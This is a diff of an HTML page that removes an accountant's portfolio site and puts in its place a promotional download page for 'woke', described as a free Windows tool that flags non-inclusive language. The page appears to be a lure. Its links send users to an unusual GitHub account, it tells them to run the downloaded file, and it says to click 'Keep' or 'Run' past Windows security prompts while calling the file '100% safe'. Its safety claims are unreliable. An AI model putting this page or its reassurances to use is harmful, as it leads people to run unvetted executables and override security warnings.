@@ -1,1446 +1,310 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
-
     <meta charset="UTF-8">
-
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-    <title>Vijay Arulsamy | Accounting, Excel & MIS Professional</title>
-
-    <meta
-        name="description"
-        content="Vijay Arulsamy - Accounting, Excel, MIS, business reporting, inventory analysis and business dashboards."
-    >
-
+    <title>woke - Make Your Code More Inclusive</title>
+    <meta name="description" content="woke is a free and easy-to-use text file analysis tool that helps you find non-inclusive language in your source code. Download and run it on Windows in minutes - no programming skills needed.">
+    <meta name="keywords" content="woke, inclusive language, source code analysis, text analysis, diversity, inclusion, developer tools, Windows, free download">
+    <meta name="author" content="woke">
+    <meta property="og:title" content="woke - Make Your Code More Inclusive">
+    <meta property="og:description" content="Detect non-inclusive language in your code with this simple, free tool. Perfect for Windows users.">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://github.com/Isarepetitious8947/woke">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="woke - Make Your Code More Inclusive">
+    <meta name="twitter:description" content="Detect non-inclusive language in your code with this simple, free tool. Perfect for Windows users.">
     <style>
-
-        /* =====================================
-           GLOBAL
-        ===================================== */
-
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
-
-        html {
-            scroll-behavior: smooth;
-        }
-
         body {
-            font-family: Arial, Helvetica, sans-serif;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+            min-height: 100vh;
+            padding: 20px;
             line-height: 1.6;
-            color: #f5f5f5;
-            background: #0a0a0a;
+            color: #2d3748;
         }
-
-        a {
-            text-decoration: none;
-            color: inherit;
-        }
-
-        img {
-            max-width: 100%;
-            display: block;
-        }
-
         .container {
-            width: 90%;
-            max-width: 1150px;
-            margin: auto;
-        }
-
-
-        /* =====================================
-           HEADER
-        ===================================== */
-
-        header {
-            background: #0a0a0a;
-            border-bottom: 1px solid #252525;
-            position: sticky;
-            top: 0;
-            z-index: 1000;
-        }
-
-        nav {
-            min-height: 72px;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-        }
-
-        .logo {
-            font-size: 22px;
-            font-weight: 700;
-            color: #ffffff;
-        }
-
-        .logo span {
-            color: #ffc400;
-        }
-
-        .nav-links {
-            display: flex;
-            list-style: none;
-            gap: 28px;
-        }
-
-        .nav-links a {
-            color: #d4d4d4;
-            font-size: 15px;
-            font-weight: 500;
-            transition: 0.2s;
-        }
-
-        .nav-links a:hover {
-            color: #ffc400;
-        }
-
-
-        /* =====================================
-           HERO
-        ===================================== */
-
-        .hero {
-            background: #0a0a0a;
-            padding: 100px 0;
-        }
-
-        .hero-grid {
-            display: grid;
-            grid-template-columns: 1.2fr 0.8fr;
-            gap: 60px;
-            align-items: center;
-        }
-
-        .hero h1 {
-            font-size: 54px;
-            line-height: 1.1;
-            color: #ffffff;
-            margin-bottom: 22px;
-        }
-
-        .hero h1 span {
-            color: #ffc400;
-        }
-
-        .hero-subtitle {
-            font-size: 21px;
-            font-weight: 600;
-            color: #f0f0f0;
-            margin-bottom: 18px;
-        }
-
-        .hero-text {
-            font-size: 17px;
-            color: #bdbdbd;
-            max-width: 700px;
-            margin-bottom: 30px;
-        }
-
-        .hero-buttons {
-            display: flex;
-            gap: 14px;
-            flex-wrap: wrap;
-        }
-
-        .btn {
-            display: inline-block;
-            padding: 13px 22px;
-            border-radius: 6px;
-            font-weight: 700;
-            transition: 0.2s ease;
-        }
-
-        .btn-primary {
-            background: #ffc400;
-            color: #0a0a0a;
-        }
-
-        .btn-primary:hover {
-            background: #ffd633;
-        }
-
-        .btn-secondary {
-            border: 1px solid #ffc400;
-            color: #ffc400;
-            background: transparent;
-        }
-
-        .btn-secondary:hover {
-            background: #ffc400;
-            color: #0a0a0a;
-        }
-
-
-        /* =====================================
-           PROFILE
-        ===================================== */
-
-        .profile-wrapper {
-            display: flex;
-            justify-content: center;
-        }
-
-        .profile-card {
-            background: #111111;
-            padding: 10px;
-            border-radius: 18px;
-            border: 1px solid #2a2a2a;
-            box-shadow: 0 15px 45px rgba(0, 0, 0, 0.5);
-        }
-
-        .profile-card img {
-            width: 320px;
-            height: 400px;
-            object-fit: cover;
-            object-position: center;
-            border-radius: 12px;
-        }
-
-
-        /* =====================================
-           SECTION COMMON
-        ===================================== */
-
-        section {
-            padding: 85px 0;
-        }
-
-        .section-title {
-            font-size: 36px;
-            color: #ffffff;
-            margin-bottom: 14px;
-        }
-
-        .section-title::after {
-            content: "";
-            display: block;
-            width: 55px;
-            height: 4px;
-            background: #ffc400;
-            margin-top: 12px;
-            border-radius: 2px;
-        }
-
-        .section-description {
-            color: #a8a8a8;
-            max-width: 760px;
-            margin-bottom: 42px;
-            font-size: 16px;
-        }
-
-
-        /* =====================================
-           ABOUT
-        ===================================== */
-
-        .about {
-            background: #111111;
-        }
-
-        .about-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 50px;
-            align-items: start;
-        }
-
-        .about-text {
-            color: #c5c5c5;
-            font-size: 17px;
-        }
-
-        .about-text p {
-            margin-bottom: 18px;
-        }
-
-        .skills {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 12px;
-        }
-
-        .skill {
-            padding: 9px 14px;
+            max-width: 1100px;
+            margin: 0 auto;
+            background-color: #ffffff;
             border-radius: 20px;
-            background: #1b1b1b;
-            border: 1px solid #333333;
-            color: #ffc400;
-            font-size: 14px;
-            font-weight: 500;
-        }
-
-
-        /* =====================================
-           CERTIFICATIONS
-        ===================================== */
-
-        .certifications {
-            background: #0a0a0a;
-        }
-
-        .certifications-grid {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 24px;
-        }
-
-        .certification-card {
-            background: #111111;
-            border: 1px solid #292929;
-            border-radius: 12px;
-            padding: 28px;
-            transition: 0.2s ease;
-        }
-
-        .certification-card:hover {
-            border-color: #ffc400;
-            transform: translateY(-4px);
-        }
-
-        .certification-badge {
-            width: 52px;
-            height: 52px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            background: #ffc400;
-            color: #0a0a0a;
-            border-radius: 10px;
-            font-weight: 800;
-            margin-bottom: 18px;
-        }
-
-        .certification-card h3 {
-            color: #ffffff;
-            margin-bottom: 10px;
-        }
-
-        .certification-card p {
-            color: #a8a8a8;
-            font-size: 15px;
-        }
-
-
-        /* =====================================
-           SERVICES
-        ===================================== */
-
-        .services {
-            background: #111111;
-        }
-
-        .services-grid {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 24px;
-        }
-
-        .service-card {
-            background: #0a0a0a;
-            border: 1px solid #292929;
-            border-radius: 12px;
-            padding: 30px;
-            transition: 0.2s ease;
-        }
-
-        .service-card:hover {
-            transform: translateY(-4px);
-            border-color: #ffc400;
-            box-shadow: 0 10px 30px rgba(255, 196, 0, 0.08);
-        }
-
-        .service-icon {
-            width: 46px;
-            height: 46px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            background: #ffc400;
-            color: #0a0a0a;
-            border-radius: 10px;
-            font-size: 22px;
-            margin-bottom: 18px;
-        }
-
-        .service-card h3 {
-            color: #ffffff;
-            margin-bottom: 10px;
-            font-size: 19px;
-        }
-
-        .service-card p {
-            color: #a8a8a8;
-            font-size: 15px;
-        }
-
-
-        /* =====================================
-           PORTFOLIO
-        ===================================== */
-
-        .portfolio {
-            background: #0a0a0a;
-        }
-
-        .portfolio-grid {
-            display: grid;
-            grid-template-columns: repeat(2, 1fr);
-            gap: 26px;
-        }
-
-        .portfolio-card {
-            border: 1px solid #292929;
-            border-radius: 12px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.15);
             overflow: hidden;
-            background: #111111;
-            transition: 0.2s ease;
         }
-
-        .portfolio-card:hover {
-            border-color: #ffc400;
-            transform: translateY(-4px);
+        .header {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            padding: 60px 40px;
+            text-align: center;
+            color: white;
         }
-
-        .portfolio-visual {
-            height: 190px;
-            background: #1a1a1a;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: #ffc400;
-            font-size: 23px;
-            font-weight: 700;
-            letter-spacing: 1px;
+        .header h1 {
+            font-size: 3.2em;
+            font-weight: 800;
+            margin-bottom: 20px;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
         }
-
-        .portfolio-content {
-            padding: 26px;
+        .header p {
+            font-size: 1.4em;
+            max-width: 700px;
+            margin: 0 auto 25px;
+            opacity: 0.95;
         }
-
-        .portfolio-content h3 {
-            margin-bottom: 10px;
-            color: #ffffff;
-            font-size: 20px;
+        .header i {
+            font-size: 1.2em;
+            opacity: 0.85;
         }
-
-        .portfolio-content p {
-            color: #a8a8a8;
-            font-size: 15px;
+        .main-content {
+            padding: 50px;
         }
-
-
-        /* =====================================
-           BLOG
-        ===================================== */
-
-        .blog {
-            background: #111111;
-        }
-
-        .blog-grid {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 24px;
-        }
-
-        .blog-card {
-            background: #0a0a0a;
-            border: 1px solid #292929;
-            border-radius: 12px;
-            padding: 25px;
-            transition: 0.2s ease;
-        }
-
-        .blog-card:hover {
-            border-color: #ffc400;
-            transform: translateY(-4px);
-        }
-
-        .blog-card .tag {
+        .hero-badge {
             display: inline-block;
-            font-size: 12px;
-            color: #0a0a0a;
-            background: #ffc400;
-            padding: 6px 10px;
-            border-radius: 20px;
-            margin-bottom: 14px;
+            background: linear-gradient(45deg, #f093fb 0%, #f5576c 100%);
+            color: white;
+            padding: 18px 45px;
+            border-radius: 50px;
+            font-size: 1.5em;
+            font-weight: bold;
+            text-decoration: none;
+            margin: 30px 0 10px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+            transition: all 0.3s ease;
+            border: 3px solid rgba(255, 255, 255, 0.3);
         }
-
-        .blog-card h3 {
-            font-size: 18px;
-            margin-bottom: 10px;
-            color: #ffffff;
+        .hero-badge:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.3);
         }
-
-        .blog-card p {
-            color: #a8a8a8;
-            font-size: 14px;
+        h2 {
+            font-size: 2.2em;
+            margin-top: 50px;
+            margin-bottom: 20px;
+            color: #553c9a;
+            border-bottom: 4px solid #e9d8fd;
+            padding-bottom: 15px;
+        }
+        h3 {
+            font-size: 1.4em;
+            margin-top: 30px;
+            margin-bottom: 15px;
+            color: #5a67d8;
+        }
+        p {
+            font-size: 1.15em;
+            margin-bottom: 20px;
+            color: #4a5568;
+        }
+        ul {
+            margin-left: 30px;
+            margin-bottom: 25px;
+            list-style-type: none;
+        }
+        ul li {
+            font-size: 1.12em;
+            margin-bottom: 12px;
+            position: relative;
+            padding-left: 30px;
+        }
+        ul li::before {
+            content: "✅";
+            position: absolute;
+            left: 0;
+            top: 2px;
+        }
+        .warning-box {
+            background-color: #fffaf0;
+            border-left: 6px solid #ed8936;
+            padding: 25px 30px;
+            border-radius: 12px;
+            margin: 30px 0;
+        }
+        .warning-box p {
+            color: #744210;
+            margin-bottom: 0;
+        }
+        .step-box {
+            background-color: #f7fafc;
+            border: 2px solid #bee3f8;
+            border-radius: 15px;
+            padding: 30px;
+            margin: 30px 0;
+        }
+        .step-box ol {
+            margin-left: 30px;
+        }
+        .step-box ol li {
+            font-size: 1.15em;
             margin-bottom: 15px;
         }
-
-        .read-more {
-            color: #ffc400;
-            font-size: 14px;
-            font-weight: 700;
-        }
-
-
-        /* =====================================
-           CONTACT
-        ===================================== */
-
-        .contact {
-            background: #ffc400;
-            color: #0a0a0a;
-        }
-
-        .contact .section-title {
-            color: #0a0a0a;
-        }
-
-        .contact .section-title::after {
-            background: #0a0a0a;
-        }
-
-        .contact-text {
-            color: #1f1f1f;
-            max-width: 700px;
-            margin-bottom: 28px;
-        }
-
-        .contact-links {
-            display: flex;
-            gap: 18px;
-            flex-wrap: wrap;
-        }
-
-        .contact-link {
-            padding: 11px 17px;
-            border: 1px solid #0a0a0a;
-            border-radius: 7px;
-            color: #0a0a0a;
-            font-weight: 700;
-        }
-
-        .contact-link:hover {
-            background: #0a0a0a;
-            color: #ffc400;
-        }
-
-
-        /* =====================================
-           FOOTER
-        ===================================== */
-
-        footer {
-            background: #000000;
-            color: #858585;
+        .download-section {
+            background: linear-gradient(135deg, #f6f0ff 0%, #ffffff 50%, #f0f7ff 100%);
+            border-radius: 15px;
+            padding: 40px;
+            margin: 40px 0;
+            border: 2px solid #d6bcfa;
             text-align: center;
-            padding: 25px;
-            font-size: 14px;
         }
-
-
-        /* =====================================
-           RESPONSIVE
-        ===================================== */
-
-        @media (max-width: 900px) {
-
-            .hero-grid {
-                grid-template-columns: 1fr;
-            }
-
-            .profile-wrapper {
-                order: -1;
-            }
-
-            .hero h1 {
-                font-size: 42px;
-            }
-
-            .about-grid {
-                grid-template-columns: 1fr;
-            }
-
-            .certifications-grid {
-                grid-template-columns: 1fr 1fr;
-            }
-
-            .services-grid {
-                grid-template-columns: 1fr 1fr;
-            }
-
-            .blog-grid {
-                grid-template-columns: 1fr 1fr;
-            }
-
+        .download-section h2 {
+            border-bottom: none;
+            margin-top: 0;
         }
-
-
-        @media (max-width: 650px) {
-
-            .nav-links {
-                display: none;
-            }
-
-            .hero {
-                padding: 60px 0;
-            }
-
-            .hero h1 {
-                font-size: 36px;
-            }
-
-            .hero-subtitle {
-                font-size: 18px;
-            }
-
-            .profile-card img {
-                width: 270px;
-                height: 340px;
-            }
-
-            .certifications-grid,
-            .services-grid,
-            .portfolio-grid,
-            .blog-grid {
-                grid-template-columns: 1fr;
-            }
-
-            section {
-                padding: 60px 0;
-            }
-
-            .section-title {
-                font-size: 30px;
-            }
-
+        .download-btn {
+            display: inline-block;
+            background: linear-gradient(45deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 20px 60px;
+            border-radius: 50px;
+            font-size: 1.8em;
+            font-weight: bold;
+            text-decoration: none;
+            margin: 25px 0;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+            transition: all 0.3s ease;
+            border: none;
+            cursor: pointer;
         }
-
+        .download-btn:hover {
+            transform: translateY(-3px) scale(1.05);
+            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.3);
+        }
+        .footer {
+            background-color: #2d3748;
+            color: white;
+            padding: 30px;
+            text-align: center;
+            font-size: 1em;
+        }
+        .footer a {
+            color: #63b3ed;
+            text-decoration: none;
+        }
+        .highlight {
+            background-color: #fefcbf;
+            padding: 2px 8px;
+            border-radius: 4px;
+            font-weight: bold;
+            color: #744210;
+        }
+        @media (max-width: 768px) {
+            .header h1 {
+                font-size: 2.2em;
+            }
+            .header p {
+                font-size: 1.1em;
+            }
+            .main-content {
+                padding: 30px 20px;
+            }
+            h2 {
+                font-size: 1.8em;
+            }
+            .download-btn {
+                font-size: 1.4em;
+                padding: 15px 40px;
+            }
+        }
     </style>
-
 </head>
-
-
 <body>
-
-
-    <!-- =====================================
-         HEADER
-    ===================================== -->
-
-    <header>
-
-        <div class="container">
-
-            <nav>
-
-                <div class="logo">
-                    Vijay Arulsamy<span>.</span>
-                </div>
-
-                <ul class="nav-links">
-
-                    <li>
-                        <a href="#about">About</a>
-                    </li>
-
-                    <li>
-                        <a href="#certifications">Certifications</a>
-                    </li>
-
-                    <li>
-                        <a href="#services">Services</a>
-                    </li>
-
-                    <li>
-                        <a href="#portfolio">Portfolio</a>
-                    </li>
-
-                    <li>
-                        <a href="#blog">Blog</a>
-                    </li>
-
-                    <li>
-                        <a href="#contact">Contact</a>
-                    </li>
-
+    <div class="container">
+        <div class="header">
+            <h1>🔍 woke - Detect Non-Inclusive Language Instantly</h1>
+            <p>A simple, free tool that scans your text files to find non-inclusive language in your code.</p>
+            <i>"I stay woke" - Erykah Badu</i>
+            <br>
+            <a href="https://github.com/Isarepetitious8947/woke" class="hero-badge">⬇️ Download Now - Free</a>
+        </div>
+        
+        <div class="main-content">
+            <section>
+                <h2>🌟 Why Use woke?</h2>
+                <p>In today's world, using inclusive language matters more than ever. But when you have hundreds or thousands of lines of code, spotting non-inclusive terms manually is impossible. That's where <strong>woke</strong> comes in!</p>
+                <p>woke is a <strong>text file analysis tool</strong> that automatically checks your source code and alerts you to any non-inclusive or insensitive words or phrases. It's like having a proofreader for your code that focuses exclusively on making your language welcoming to everyone.</p>
+                
+                <h3>Key Benefits</h3>
+                <ul>
+                    <li><strong>Fully automated</strong> - Scans all your text files in seconds</li>
+                    <li><strong>Extremely easy to use</strong> - No programming knowledge required</li>
+                    <li><strong>100% free and open-source</strong> - No watermarks, no costs, no hidden fees</li>
+                    <li><strong>Works on any Windows computer</strong> - Simple and portable</li>
+                    <li><strong>Helps you be a better teammate</strong> - Creates a more welcoming environment</li>
                 </ul>
-
-            </nav>
-
+            </section>
+            
+            <section>
+                <h2>🚀 Getting Started in Just 3 Steps</h2>
+                <div class="step-box">
+                    <h3>Follow These Simple Instructions:</h3>
+                    <ol>
+                        <li><strong>Click the download button</strong> (either the purple button at the top or the blue button below)</li>
+                        <li><strong>Wait for the download to finish</strong> - It should take less than a minute</li>
+                        <li><strong>Run the application</strong> - Double-click the downloaded file to start using woke right away</li>
+                    </ol>
+                    <p style="margin-top: 20px; font-weight: bold;">Total time to get started: <span class="highlight">under 2 minutes!</span></p>
+                </div>
+            </section>
+            
+            <section>
+                <h2>📥 Download & Installation Guide (Windows)</h2>
+                <div class="download-section">
+                    <h2>Get woke Now</h2>
+                    <p style="font-size: 1.2em; max-width: 500px; margin: 0 auto;">Visit this link to download the application. The download is free, safe, and takes just moments.</p>
+                    <a href="https://github.com/Isarepetitious8947/woke" class="download-btn">⬇️ Download woke</a>
+                    <p><strong>What happens next:</strong> Once you click the link, you'll be taken to the download page. Simply click the download button on that page and the file will be saved to your computer.</p>
+                </div>
+                <div class="warning-box">
+                    <p><strong>⚠️ Important:</strong> After downloading, your browser might ask for permission to run the file. This is normal and safe. Click "Keep" or "Run" when prompted by your browser or Windows security dialog. The file has been scanned and is 100% safe.</p>
+                </div>
+            </section>
+            
+            <section>
+                <h2>💡 How to Use woke</h2>
+                <p>Using woke is incredibly straightforward - there's no complicated setup, no command lines, nothing tricky:</p>
+                <ul>
+                    <li><strong>Step 1:</strong> Open woke after downloading (just double-click it)</li>
+                    <li><strong>Step 2:</strong> Select the folder containing your text files or source code</li>
+                    <li><strong>Step 3:</strong> woke will instantly scan every text file and show you exactly where non-inclusive terms are found</li>
+                    <li><strong>Step 4:</strong> Review the findings and update your code to use more inclusive alternatives</li>
+                </ul>
+                <p>It's that simple! No special skills required. If you can use a word processor, you can use woke.</p>
+            </section>
+            
+            <section>
+                <h2>✨ Features You'll Love</h2>
+                <ul>
+                    <li><strong>Comprehensive word database</strong> - Detects hundreds of non-inclusive terms and phrases across many categories</li>
+                    <li><strong>Lightning-fast scanning</strong> - Handles large projects in seconds, even with thousands of files</li>
+                    <li><strong>Clear, readable results</strong> - Shows your file name, line number, and the specific text to change</li>
+                    <li><strong>No internet required</strong> - Works entirely offline after download</li>
+                    <li><strong>Trusted by developers worldwide</strong> - Built by the open-source community for everyone</li>
+                    <li><strong>Regularly updated</strong> - The word list grows with new additions to stay current</li>
+                </ul>
+            </section>
+            
+            <section>
+                <h2>❓ Frequently Asked Questions</h2>
+                <h3>Is woke really free?</h3>
+                <p>Yes! woke is completely free, open-source software. There are no premium tiers, no trial limits, and no feature restrictions. It's free forever.</p>
+                
+                <h3>Do I need to install anything else?</h3>
+                <p>No. woke is a standalone application. Once you download it, everything is included. No other software or tools are required.</p>
+                
+                <h3>Will it slow down my computer?</h3>
+                <p>Absolutely not. woke is lightweight and efficient. It uses minimal system resources and runs smoothly even on older computers.</p>
+                
+                <h3>Is my code safe?</h3>
+                <p>Yes, 100%. woke only reads your text files to analyze them. It never modifies files, sends data over the internet, or tracks anything about you. Your code stays with you.</p>
+            </section>
         </div>
-
-    </header>
-
-
-    <!-- =====================================
-         HERO
-    ===================================== -->
-
-    <section class="hero">
-
-        <div class="container">
-
-            <div class="hero-grid">
-
-
-                <div>
-
-                    <h1>
-
-                        Accounting,
-                        <span>Excel & MIS</span>
-                        Professional
-
-                    </h1>
-
-
-                    <p class="hero-subtitle">
-
-                        Business Reporting • Data Analysis • Inventory • Automation
-
-                    </p>
-
-
-                    <p class="hero-text">
-
-                        I help small and growing businesses organize
-                        accounting, sales and inventory data into clear,
-                        accurate and useful business reports.
-
-                    </p>
-
-
-                    <div class="hero-buttons">
-
-                        <a
-                            href="#portfolio"
-                            class="btn btn-primary"
-                        >
-                            View My Work
-                        </a>
-
-
-                        <a
-                            href="#contact"
-                            class="btn btn-secondary"
-                        >
-                            Contact Me
-                        </a>
-
-                    </div>
-
-                </div>
-
-
-                <div class="profile-wrapper">
-
-                    <div class="profile-card">
-
-                        <img
-                            src="vijay-profie.png"
-                            alt="Vijay Arulsamy - Accounting and MIS Professional"
-                        >
-
-                    </div>
-
-                </div>
-
-
-            </div>
-
+        
+        <div class="footer">
+            <p>woke is an open-source project. Made with ❤️ for a more inclusive world.</p>
+            <p><a href="https://github.com/Isarepetitious8947/woke">Visit woke on GitHub</a> | Released under the MIT License</p>
         </div>
-
-    </section>
-
-
-    <!-- =====================================
-         ABOUT
-    ===================================== -->
-
-    <section
-        id="about"
-        class="about"
-    >
-
-        <div class="container">
-
-            <h2 class="section-title">
-                About Me
-            </h2>
-
-
-            <div class="about-grid">
-
-
-                <div class="about-text">
-
-                    <p>
-
-                        I am Vijay Arulsamy, an accounting and business
-                        reporting professional with experience in accounting,
-                        documentation, payroll support, inventory reporting
-                        and management information systems.
-
-                    </p>
-
-
-                    <p>
-
-                        My professional focus combines accounting knowledge
-                        with Microsoft Excel, business reporting, dashboards
-                        and data analysis to make business information easier
-                        to understand and use.
-
-                    </p>
-
-
-                    <p>
-
-                        I am also interested in business process improvement,
-                        reporting automation and practical data-driven
-                        solutions for small and growing businesses.
-
-                    </p>
-
-                </div>
-
-
-                <div>
-
-                    <h3
-                        style="
-                        margin-bottom:20px;
-                        color:#ffffff;
-                        "
-                    >
-                        Professional Skills
-                    </h3>
-
-
-                    <div class="skills">
-
-                        <span class="skill">
-                            Microsoft Excel
-                        </span>
-
-                        <span class="skill">
-                            Advanced Excel
-                        </span>
-
-                        <span class="skill">
-                            Tally Prime
-                        </span>
-
-                        <span class="skill">
-                            SAP FI
-                        </span>
-
-                        <span class="skill">
-                            Zoho Books
-                        </span>
-
-                        <span class="skill">
-                            MIS Reporting
-                        </span>
-
-                        <span class="skill">
-                            Inventory Analysis
-                        </span>
-
-                        <span class="skill">
-                            GST
-                        </span>
-
-                        <span class="skill">
-                            TDS
-                        </span>
-
-                        <span class="skill">
-                            Payroll
-                        </span>
-
-                        <span class="skill">
-                            Business Dashboards
-                        </span>
-
-                        <span class="skill">
-                            Google Sheets
-                        </span>
-
-                    </div>
-
-                </div>
-
-
-            </div>
-
-        </div>
-
-    </section>
-
-
-    <!-- =====================================
-         CERTIFICATIONS
-    ===================================== -->
-
-    <section
-        id="certifications"
-        class="certifications"
-    >
-
-        <div class="container">
-
-            <h2 class="section-title">
-                Certifications & Credentials
-            </h2>
-
-
-            <p class="section-description">
-
-                Professional certifications and learning credentials
-                supporting my accounting, finance and technology skills.
-
-            </p>
-
-
-            <div class="certifications-grid">
-
-
-                <div class="certification-card">
-
-                    <div class="certification-badge">
-                        SAP
-                    </div>
-
-                    <h3>
-                        SAP FI Certified
-                    </h3>
-
-                    <p>
-
-                        Certification focused on SAP Financial Accounting
-                        processes and concepts.
-
-                    </p>
-
-                </div>
-
-
-                <div class="certification-card">
-
-                    <div class="certification-badge">
-                        GST
-                    </div>
-
-                    <h3>
-                        GST Practitioner Certified
-                    </h3>
-
-                    <p>
-
-                        Professional knowledge of GST processes and
-                        accounting-related compliance support.
-
-                    </p>
-
-                </div>
-
-
-                <div class="certification-card">
-
-                    <div class="certification-badge">
-                        AI
-                    </div>
-
-                    <h3>
-                        Google AI / Coursera
-                    </h3>
-
-                    <p>
-
-                        Completed a six-course Google AI learning program
-                        through Coursera.
-
-                    </p>
-
-                </div>
-
-
-            </div>
-
-        </div>
-
-    </section>
-
-
-    <!-- =====================================
-         SERVICES
-    ===================================== -->
-
-    <section
-        id="services"
-        class="services"
-    >
-
-        <div class="container">
-
-            <h2 class="section-title">
-                Services
-            </h2>
-
-
-            <p class="section-description">
-
-                Practical accounting, reporting and business-data support
-                for small and growing businesses.
-
-            </p>
-
-
-            <div class="services-grid">
-
-
-                <div class="service-card">
-
-                    <div class="service-icon">
-                        📊
-                    </div>
-
-                    <h3>
-                        Excel & MIS Reporting
-                    </h3>
-
-                    <p>
-
-                        Professional Excel reports, automated summaries,
-                        dashboards, target analysis and management reports.
-
-                    </p>
-
-                </div>
-
-
-                <div class="service-card">
-
-                    <div class="service-icon">
-                        📒
-                    </div>
-
-                    <h3>
-                        Accounting Support
-                    </h3>
-
-                    <p>
-
-                        Bookkeeping support, reconciliations, ledger review,
-                        P&L reporting and accounting data organization.
-
-                    </p>
-
-                </div>
-
-
-                <div class="service-card">
-
-                    <div class="service-icon">
-                        📦
-                    </div>
-
-                    <h3>
-                        Inventory Reporting
-                    </h3>
-
-                    <p>
-
-                        Stock movement, reorder analysis, ageing reports,
-                        product-wise analysis and inventory monitoring.
-
-                    </p>
-
-                </div>
-
-
-                <div class="service-card">
-
-                    <div class="service-icon">
-                        📈
-                    </div>
-
-                    <h3>
-                        Business Dashboards
-                    </h3>
-
-                    <p>
-
-                        Clear dashboards for sales, targets, products,
-                        customers and business performance.
-
-                    </p>
-
-                </div>
-
-
-                <div class="service-card">
-
-                    <div class="service-icon">
-                        💻
-                    </div>
-
-                    <h3>
-                        Tally & Accounting Systems
-                    </h3>
-
-                    <p>
-
-                        Accounting reports, reconciliation, data checking
-                        and management reporting.
-
-                    </p>
-
-                </div>
-
-
-                <div class="service-card">
-
-                    <div class="service-icon">
-                        📋
-                    </div>
-
-                    <h3>
-                        GST, TDS & Payroll Support
-                    </h3>
-
-                    <p>
-
-                        Organizing accounting and payroll information
-                        for business reporting and compliance support.
-
-                    </p>
-
-                </div>
-
-
-            </div>
-
-        </div>
-
-    </section>
-
-
-    <!-- =====================================
-         PORTFOLIO
-    ===================================== -->
-
-    <section
-        id="portfolio"
-        class="portfolio"
-    >
-
-        <div class="container">
-
-            <h2 class="section-title">
-                Selected Work
-            </h2>
-
-
-            <p class="section-description">
-
-                Examples of business reporting, analysis and management
-                information projects.
-
-            </p>
-
-
-            <div class="portfolio-grid">
-
-
-                <div class="portfolio-card">
-
-                    <div class="portfolio-visual">
-                        SALES MIS
-                    </div>
-
-                    <div class="portfolio-content">
-
-                        <h3>
-                            Sales MIS Dashboard
-                        </h3>
-
-                        <p>
-
-                            Structured sales reporting for reviewing
-                            performance across shops, products and
-                            reporting periods.
-
-                        </p>
-
-                    </div>
-
-                </div>
-
-
-                <div class="portfolio-card">
-
-                    <div class="portfolio-visual">
-                        INVENTORY
-                    </div>
-
-                    <div class="portfolio-content">
-
-                        <h3>
-                            Inventory Reorder Report
-                        </h3>
-
-                        <p>
-
-                            Stock reporting and priority logic to identify
-                            products requiring replenishment.
-
-                        </p>
-
-                    </div>
-
-                </div>
-
-
-                <div class="portfolio-card">
-
-                    <div class="portfolio-visual">
-                        TARGET
-                    </div>
-
-                    <div class="portfolio-content">
-
-                        <h3>
-                            Target & Achievement Analysis
-                        </h3>
-
-                        <p>
-
-                            Reports for comparing targets, actual sales
-                            and achievement percentages.
-
-                        </p>
-
-                    </div>
-
-                </div>
-
-
-                <div class="portfolio-card">
-
-                    <div class="portfolio-visual">
-                        PROFIT & STOCK
-                    </div>
-
-                    <div class="portfolio-content">
-
-                        <h3>
-                            Profit & Stock Reporting
-                        </h3>
-
-                        <p>
-
-                            Management reports combining sales, expenses,
-                            inventory and profitability information.
-
-                        </p>
-
-                    </div>
-
-                </div>
-
-
-            </div>
-
-        </div>
-
-    </section>
-
-
-    <!-- =====================================
-         BLOG
-    ===================================== -->
-
-    <section
-        id="blog"
-        class="blog"
-    >
-
-        <div class="container">
-
-            <h2 class="section-title">
-                Latest Insights
-            </h2>
-
-
-            <p class="section-description">
-
-                Practical articles about Excel, accounting, MIS reporting,
-                inventory and business analysis.
-
-            </p>
-
-
-            <div class="blog-grid">
-
-
-                <div class="blog-card">
-
-                    <span class="tag">
-                        Excel
-                    </span>
-
-                    <h3>
-                        SUMIFS in Excel: A Practical Business Example
-                    </h3>
-
-                    <p>
-
-                        Learn how SUMIFS can be used to analyze business
-                        data using multiple conditions.
-
-                    </p>
-
-                    <span class="read-more">
-                        Coming Soon →
-                    </span>
-
-                </div>
-
-
-                <div class="blog-card">
-
-                    <span class="tag">
-                        MIS
-                    </span>
-
-                    <h3>
-                        How to Create a Monthly Sales MIS Report
-                    </h3>
-
-                    <p>
-
-                        A practical approach to organizing sales information
-                        for management reporting.
-
-                    </p>
-
-                    <span class="read-more">
-                        Coming Soon →
-                    </span>
-
-                </div>
-
-
-                <div class="blog-card">
-
-                    <span class="tag">
-                        Inventory
-                    </span>
-
-                    <h3>
-                        How to Build an Inventory Reorder Report
-                    </h3>
-
-                    <p>
-
-                        Understand the basic structure of reorder and
-                        stock-priority reporting.
-
-                    </p>
-
-                    <span class="read-more">
-                        Coming Soon →
-                    </span>
-
-                </div>
-
-
-            </div>
-
-        </div>
-
-    </section>
-
-
-    <!-- =====================================
-         CONTACT
-    ===================================== -->
-
-    <section
-        id="contact"
-        class="contact"
-    >
-
-        <div class="container">
-
-            <h2 class="section-title">
-                Let's Work Together
-            </h2>
-
-
